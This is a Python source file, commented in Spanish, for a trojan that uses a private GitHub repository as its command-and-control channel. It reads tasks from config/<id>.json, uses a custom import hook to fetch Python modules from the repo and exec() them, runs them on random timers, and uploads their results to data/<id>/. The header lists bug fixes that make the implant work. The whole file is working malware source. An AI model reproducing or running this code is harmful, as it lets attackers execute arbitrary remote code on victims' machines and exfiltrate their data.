"""
git_trojan.py - Troyano con canal de mando y control en GitHub
==============================================================
Troyano que usa un repositorio privado de GitHub como infraestructura
de C2 (Command & Control):
  - Lee su configuración de tareas desde config/<id>.json en el repo.
  - Importa dinámicamente los módulos de la carpeta modules/ del repo.
  - Ejecuta cada módulo (run()) y sube el resultado a data/<id>/<timestamp>.data.

La clase GitImporter se registra en sys.meta_path para interceptar las
importaciones de módulos y descargarlos del repo en lugar del sistema
de ficheros local.

ERRORES CORREGIDOS:
    1. `base64.b64decode(bindata)` en store_module_result → debería ser
       `base64.b64encode(bindata)`. El contenido (bindata) son bytes que
       se quieren codificar para guardarlos como texto en GitHub; decodificar
       bytes ya en binario produce basura o un error.
    2. Nombre de usuario personal `'tiarno'` reemplazado por variable
       de entorno GITHUB_USER.

REQUISITOS:
    pip install github3.py

EJEMPLOS DE EJECUCIÓN:
    # Crear mytoken.txt con un token personal de GitHub con permisos 'repo':
    echo "ghp_tutoken" > mytoken.txt
    GITHUB_USER=tu_usuario python git_trojan.py
"""

import base64
import importlib
import importlib.util
import json
import os
import random
import sys
import threading
import time

from datetime import datetime

import github3


# -------------------------------------------------------------------
# Configuración — leer desde variables de entorno
# -------------------------------------------------------------------
GITHUB_USER = os.environ.get('GITHUB_USER', 'usuario_lab')   # FIX: usuario personal eliminado
REPO_NAME   = 'bhptrojan'


def github_connect():
    """
    Autentica con GitHub usando el token almacenado en mytoken.txt
    y devuelve el objeto repositorio.

    Returns:
        github3.repos.Repository: Repositorio del troyano en GitHub.
    """
    with open('mytoken.txt') as f:
        token = f.read().strip()
    sess = github3.login(token=token)
    return sess.repository(GITHUB_USER, REPO_NAME)


def get_file_contents(dirname, module_name, repo):
    """
    Descarga el contenido (en Base64) de un fichero del repositorio GitHub.

    Args:
        dirname     (str): Subdirectorio del repo (p. ej. 'modules', 'config').
        module_name (str): Nombre del fichero.
        repo:              Objeto repositorio de github3.

    Returns:
        bytes: Contenido codificado en Base64 del fichero.
    """
    return repo.file_contents(f'{dirname}/{module_name}').content


class Trojan:
    """Troyano que recibe tareas desde GitHub y ejecuta módulos dinámicamente."""

    def __init__(self, trojan_id):
        self.id          = trojan_id
        self.config_file = f'{trojan_id}.json'
        self.data_path   = f'data/{trojan_id}/'
        self.repo        = github_connect()

    def get_config(self):
        """
        Descarga y parsea el fichero de configuración JSON del repositorio.
        Importa dinámicamente los módulos indicados en la configuración.

        Returns:
            list[dict]: Lista de tareas, cada una con al menos 'module'.
        """
        config_json = get_file_contents('config', self.config_file, self.repo)
        config      = json.loads(base64.b64decode(config_json))

        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        return config

    def module_runner(self, module):
        """
        Ejecuta el módulo indicado y almacena el resultado en el repositorio.

        Args:
            module (str): Nombre del módulo a ejecutar.
        """
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        """
        Codifica el resultado en Base64 y lo sube al repositorio GitHub
        como fichero en data/<id>/<timestamp>.data.

        Args:
            data: Resultado devuelto por el módulo (se convierte a bytes).
        """
        message  = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata  = bytes('%r' % data, 'utf-8')
        # FIX: `b64decode(bindata)` → `b64encode(bindata)`
        #       El contenido debe codificarse (encode) para enviarse a GitHub,
        #       no decodificarse (decode), lo que produciría datos corruptos.
        self.repo.create_file(remote_path, message, base64.b64encode(bindata))

    def run(self):
        """
        Bucle principal: lee la config, lanza un hilo por módulo y espera
        entre 30 minutos y 3 horas antes de la siguiente iteración.
        """
        while True:
            config = self.get_config()
            for task in config:
                t = threading.Thread(
                    target=self.module_runner, args=(task['module'],)
                )
                t.start()
                time.sleep(random.randint(1, 10))
            time.sleep(random.randint(30 * 60, 3 * 60 * 60))


class GitImporter:
    """
    Importador personalizado (sys.meta_path) que descarga módulos Python
    del repositorio GitHub en lugar de buscarlos en el sistema de ficheros.
    """

    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        """
        Intenta descargar el módulo `name` del repositorio.
        Si existe, almacena su código y devuelve self (loader).

        Args:
            name (str): Nombre del módulo a importar.
            path: No usado (requerido por la interfaz).

        Returns:
            GitImporter | None: self si el módulo existe en el repo, None si no.
        """
        print("[*] Intentando recuperar %s" % name)
        self.repo     = github_connect()
        new_library   = get_file_contents('modules', f'{name}.py', self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return self

    def load_module(self, name):
        """
        Carga el módulo descargado en el espacio de nombres de Python.

        Args:
            name (str): Nombre del módulo.

        Returns:
            ModuleType: Módulo cargado.
        """
        spec       = importlib.util.spec_from_loader(
            name, loader=None, origin=self.repo.git_url
        )
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module


if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()
